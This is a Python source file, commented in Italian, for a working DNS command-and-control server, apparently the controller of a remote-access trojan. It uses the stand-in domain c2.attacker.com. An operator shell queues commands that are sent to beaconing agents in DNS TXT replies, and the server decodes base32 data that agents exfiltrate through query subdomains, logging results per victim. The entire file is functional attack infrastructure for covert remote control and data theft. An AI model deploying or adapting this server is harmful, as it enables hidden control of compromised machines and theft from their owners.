#!/usr/bin/env python3
"""
DNS C2 Server v2 — con output raggruppato e leggibile
"""

import socket
import struct
import threading
import base64
import time
import random
from datetime import datetime
from collections import defaultdict

C2_DOMAIN   = "c2.attacker.com"
LISTEN_IP   = "0.0.0.0"
LISTEN_PORT = 53
LOG_FILE    = "/tmp/rat_log.txt"

pending_commands = []
command_lock = threading.Lock()

# Storico comandi e risultati
command_history = []
current_results = defaultdict(list)
last_command = {}
result_lock = threading.Lock()

B32_ALPHA = "abcdefghijklmnopqrstuvwxyz234567"

def base32_decode_custom(s):
    std_alpha = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    result = ""
    for c in s.upper():
        idx = B32_ALPHA.find(c.lower())
        if idx >= 0:
            result += std_alpha[idx]
        elif c in std_alpha:
            result += c
    pad = (8 - len(result) % 8) % 8
    result += "=" * pad
    try:
        return base64.b32decode(result).decode('utf-8', errors='replace')
    except:
        return s

def parse_dns_query(data):
    try:
        transaction_id = struct.unpack('>H', data[0:2])[0]
        qdcount = struct.unpack('>H', data[4:6])[0]
        if qdcount == 0:
            return None, transaction_id
        name_parts = []
        i = 12
        while i < len(data):
            length = data[i]
            if length == 0:
                break
            i += 1
            name_parts.append(data[i:i+length].decode('utf-8', errors='replace'))
            i += length
        name = ".".join(name_parts)
        return name, transaction_id
    except:
        return None, 0

def build_dns_response(transaction_id, query_name, txt_data):
    flags = 0x8180
    qdcount = 1
    ancount = 1 if txt_data else 0
    header = struct.pack('>HHHHHH',
        transaction_id, flags, qdcount, ancount, 0, 0)

    question = b""
    for part in query_name.split("."):
        part_enc = part.encode()
        question += struct.pack('B', len(part_enc)) + part_enc
    question += b"\x00"
    question += struct.pack('>HH', 16, 1)

    if not txt_data:
        return header + question

    answer = b"\xc0\x0c"
    answer += struct.pack('>H', 16)
    answer += struct.pack('>H', 1)
    ttl = random.randint(60, 3600)
    answer += struct.pack('>I', ttl)
    txt_bytes = txt_data.encode('utf-8')
    txt_rdata = struct.pack('B', len(txt_bytes)) + txt_bytes
    answer += struct.pack('>H', len(txt_rdata))
    answer += txt_rdata

    return header + question + answer

def flush_results(agent_ip):
    """Mostra i risultati accumulati in modo pulito"""
    with result_lock:
        if agent_ip in current_results and current_results[agent_ip]:
            cmd = last_command.get(agent_ip, "???")
            results = current_results[agent_ip]
            
            print(f"\n{'='*60}")
            print(f"  RISULTATO [{agent_ip}] → {cmd}")
            print(f"{'='*60}")
            for line in results:
                print(f"  {line}")
            print(f"{'='*60}\n")
            
            # Salva nello storico
            command_history.append({
                'time': datetime.now().strftime("%H:%M:%S"),
                'agent': agent_ip,
                'cmd': cmd,
                'output': '\n'.join(results)
            })
            
            current_results[agent_ip] = []

def handle_query(data, addr, sock):
    query_name, transaction_id = parse_dns_query(data)
    if not query_name:
        return

    timestamp = datetime.now().strftime("%H:%M:%S")
    agent_ip = addr[0]
    response_txt = ""

    if query_name.startswith("beacon."):
        # Prima del beacon mostra i risultati accumulati
        flush_results(agent_ip)
        
        with command_lock:
            if pending_commands:
                response_txt = pending_commands.pop(0)
                last_command[agent_ip] = response_txt
                current_results[agent_ip] = []
                print(f"[{timestamp}] ► [{agent_ip}] Invio: {response_txt}")
            else:
                print(f"[{timestamp}] · [{agent_ip}] beacon")

        log(f"BEACON da {agent_ip}")

    elif C2_DOMAIN in query_name:
        parts = query_name.replace("." + C2_DOMAIN, "").split(".")
        if len(parts) >= 2:
            seq = parts[0]
            encoded_data = ".".join(parts[1:])
            decoded = base32_decode_custom(encoded_data)
            
            with result_lock:
                current_results[agent_ip].append(decoded)

        log(f"RESULT: {query_name[:50]}")

    response = build_dns_response(transaction_id, query_name, response_txt)
    sock.sendto(response, addr)

def log(msg):
    with open(LOG_FILE, "a") as f:
        f.write(f"[{datetime.now()}] {msg}\n")

def show_history():
    """Mostra lo storico comandi"""
    if not command_history:
        print("  Nessun comando eseguito ancora.")
        return
    for i, entry in enumerate(command_history):
        print(f"\n  [{i}] {entry['time']} | {entry['agent']} | {entry['cmd']}")
        print(f"  {'-'*50}")
        for line in entry['output'].split('\n'):
            if line.strip():
                print(f"  {line}")

def operator_shell():
    print("\n" + "="*60)
    print("  DNS C2 Server v2")
    print("  Comandi: 'history', 'agents', 'quit'")
    print("="*60 + "\n")
    
    while True:
        try:
            cmd = input("C2> ").strip()
            if not cmd:
                continue
            if cmd == "quit":
                break
            if cmd == "history":
                show_history()
                continue
            if cmd == "agents":
                print(f"  Agenti attivi: {list(current_results.keys())}")
                continue
            with command_lock:
                pending_commands.append(cmd)
            print(f"  [+] Comando in coda: '{cmd}'")
        except (KeyboardInterrupt, EOFError):
            break

def main():
    print(f"[*] DNS C2 Server v2 — {LISTEN_IP}:{LISTEN_PORT}")
    print(f"[*] Dominio: {C2_DOMAIN}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((LISTEN_IP, LISTEN_PORT))

    def listen_loop():
        while True:
            try:
                data, addr = sock.recvfrom(4096)
                t = threading.Thread(
                    target=handle_query,
                    args=(data, addr, sock),
                    daemon=True
                )
                t.start()
            except Exception as e:
                print(f"[!] Errore: {e}")

    listener = threading.Thread(target=listen_loop, daemon=True)
    listener.start()

    operator_shell()
    sock.close()

if __name__ == "__main__":
    main()
